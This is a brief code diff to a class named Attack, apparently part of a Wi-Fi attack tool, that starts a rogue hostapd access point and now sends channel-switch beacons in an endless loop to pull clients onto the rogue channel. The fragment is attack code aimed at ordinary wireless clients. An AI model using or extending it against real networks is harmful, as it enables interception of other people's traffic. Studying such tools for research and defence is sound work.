@@ -349,9 +349,12 @@ class Attack():
 		self.hostapd = subprocess.Popen(hostapd_path, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
 		
 		log(STATUS, "Giving the rogue hostapd one second to initialize ...")
-		time.sleep(10)
-		self.send_csa_beacon(numbeacons=4)
-	
+		flag_while = 1
+		while(True):
+			time.sleep(10)
+			self.send_csa_beacon(numbeacons=4)
+			flag_while += 5
+			
 
 	def send_csa_beacon(self, numbeacons=1, target=None, silent=False):
 		newchannel = self.netconfig.rogue_channel
